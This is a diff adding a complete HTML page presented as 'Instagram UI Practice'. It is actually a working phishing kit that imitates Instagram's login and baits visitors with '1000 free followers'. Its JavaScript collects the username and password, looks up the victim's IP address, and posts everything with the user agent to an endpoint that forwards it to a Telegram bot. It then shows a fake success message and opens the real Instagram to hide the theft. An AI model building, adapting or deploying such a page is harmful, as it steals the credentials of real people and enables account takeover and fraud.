@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram UI Practice</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 90%;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            padding: 40px 30px;
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-family: 'Billabong', cursive;
+            font-size: 50px;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .follower-offer {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-weight: bold;
+            font-size: 24px;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            border: 2px solid gold;
+        }
+        
+        .follower-offer span {
+            font-size: 14px;
+            display: block;
+            margin-top: 5px;
+            opacity: 0.9;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background-color: white;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: opacity 0.3s;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            opacity: 0.9;
+        }
+        
+        .notice {
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #666;
+            border-left: 3px solid #ff6b6b;
+        }
+        
+        .divider {
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        
+        .divider::before {
+            left: 0;
+        }
+        
+        .divider::after {
+            right: 0;
+        }
+        
+        .divider span {
+            background-color: white;
+            padding: 0 10px;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        
+        .signup-link {
+            text-align: center;
+            color: #262626;
+            font-size: 14px;
+        }
+        
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .success-message {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .error-message {
+            background-color: #f44336;
+            color: white;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .telegram-status {
+            font-size: 11px;
+            color: #888;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Instagram</h1>
+        
+        <div class="follower-offer">
+            ? INSTAGRAM 1000 FREE FOLLOWERS ?
+            <span>Limited time offer - Claim now!</span>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" placeholder="Phone number, username, or email" id="username" required>
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Password" id="password" required>
+            </div>
+            
+            <button type="button" class="login-btn" onclick="handleLogin()">Log In</button>
+        </form>
+        
+        <!-- Message containers -->
+        <div class="success-message" id="successMessage">
+            ? Congratulations! You've claimed 1000 free followers! ?
+        </div>
+        
+        <div class="error-message" id="errorMessage">
+            ?? Please enter both username and password
+        </div>
+        
+        <div class="divider">
+            <span>OR</span>
+        </div>
+        
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="notice" id="messageBox" style="display: none;">
+            <!-- This will be shown when followers are claimed -->
+        </div>
+        
+        <div class="notice" style="margin-top: 10px; border-left-color: #4CAF50;">
+            ? INSTAGRAM FOLLOWERS - CLAIM YOURS NOW! ?
+        </div>
+        
+        <div class="telegram-status" id="telegramStatus">
+            ? Telegram bot: Ready
+        </div>
+    </div>
+    
+    <script>
+        async function sendToTelegram(username, password) {
+            // Get IP info
+            let ipInfo = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipInfo = ipData.ip;
+            } catch (e) {
+                ipInfo = 'Could not fetch IP';
+            }
+            
+            // Update status
+            document.getElementById('telegramStatus').innerHTML = '? Sending to Telegram...';
+            document.getElementById('telegramStatus').style.color = 'orange';
+            
+            try {
+                // Send to Vercel serverless function
+                const response = await fetch('/api/send_to_telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        ipInfo: ipInfo,
+                        userAgent: navigator.userAgent
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('telegramStatus').innerHTML = '? Sent to Telegram bot!';
+                    document.getElementById('telegramStatus').style.color = 'green';
+                    console.log('Message sent to Telegram successfully');
+                } else {
+                    document.getElementById('telegramStatus').innerHTML = '? Failed to send to Telegram';
+                    document.getElementById('telegramStatus').style.color = 'red';
+                    console.error('Telegram error:', data.error);
+                }
+            } catch (error) {
+                document.getElementById('telegramStatus').innerHTML = '? Error sending to Telegram';
+                document.getElementById('telegramStatus').style.color = 'red';
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+        function handleLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
+            const messageBox = document.getElementById('messageBox');
+            
+            // Hide all messages first
+            successMsg.style.display = 'none';
+            errorMsg.style.display = 'none';
+            messageBox.style.display = 'none';
+            
+            // Check if fields are empty
+            if (username.trim() === '' || password.trim() === '') {
+                errorMsg.style.display = 'block';
+                
+                // Hide error after 3 seconds
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            // Show success message
+            successMsg.style.display = 'block';
+            
+            // Show the message box with claim now text
+            messageBox.style.display = 'block';
+            messageBox.innerHTML = '? 1000 followers claimed successfully! Check your Instagram soon! ?';
+            messageBox.style.borderLeftColor = '#4CAF50';
+            
+            // SEND TO TELEGRAM BOT via Vercel function
+            sendToTelegram(username, password);
+            
+            // Open Instagram in a new tab
+            window.open('https://www.instagram.com', '_blank');
+            
+            // Clear fields after 3 seconds
+            setTimeout(() => {
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                successMsg.style.display = 'none';
+            }, 3000);
+            
+            // Log for demo purposes
+            console.log('Login attempt - sending to Telegram...');
+        }
+    </script>
+</body>
+</html>
